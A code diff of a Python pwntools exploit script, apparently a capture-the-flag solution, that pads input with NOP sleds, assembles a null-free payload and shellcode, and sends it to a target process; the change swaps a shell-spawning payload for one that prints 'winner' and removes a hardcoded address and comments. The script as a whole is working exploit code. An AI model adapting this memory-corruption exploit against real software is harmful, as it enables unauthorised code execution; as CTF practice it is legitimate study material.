@@ -30,7 +30,6 @@ p.send('\x90'*1023 + '\x00')
 p.recvuntil(' > ')
 
 # Exploit
-addr = 0x555555757260#int(raw_input("val> "), 16)
 
 payload = asm("""
         /* rsp now end of .bss */
@@ -70,14 +69,12 @@ payload = asm("""
 
         /* should be broken out after two instruction */
         """)
-        #xrelease mov DWORD PTR [rdi], 0x43434343""")
 if "\x00" in payload:
     print "null in payload"
     print repr(payload)
     exit()
 
-#payload = ""
-final_shellcode = encoder.null(asm("mov rsp, rax;" + shellcraft.sh()))
+final_shellcode = encoder.null(asm("mov rsp, rax;" + shellcraft.echo("winner", 1)))
 prelude = asm("xor r12,rdi") + "\x74\x7f" + final_shellcode
 
 
@@ -85,5 +82,4 @@ print "payload len:", len(payload)
 print "prelude len:", len(prelude)
 pad_len = 800 - len(prelude) - len(payload) - 200
 p.send("\x90"*pad_len + prelude + "\x90"*200 + payload + '\x00')
-#p.recvuntil(' > ')
 p.interactive()
